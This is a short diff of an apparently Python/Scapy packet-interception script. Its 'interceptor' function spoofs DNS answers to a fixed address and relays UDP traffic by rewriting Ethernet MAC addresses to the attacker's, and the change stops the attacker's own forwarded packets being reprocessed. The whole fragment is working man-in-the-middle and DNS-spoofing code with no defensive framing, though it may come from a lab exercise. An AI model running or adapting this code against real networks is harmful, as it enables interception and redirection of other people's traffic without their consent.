@@ -77,7 +77,7 @@ def interceptor(packet):
             #print(type(packet[DNS].an.rdata))
             packet[DNS].an.rdata = '10.4.63.200'
         
-        if UDP in packet and IP in packet and ip_src in valid_ips_to_mac and ip_dst in valid_ips_to_mac:
+        if UDP in packet and IP in packet and ip_src in valid_ips_to_mac and ip_dst in valid_ips_to_mac and packet[Ether].src != attackerMAC:
             packet[Ether].src = attackerMAC
             packet[Ether].dst = valid_ips_to_mac[ip_dst]
             del packet[UDP].chksum
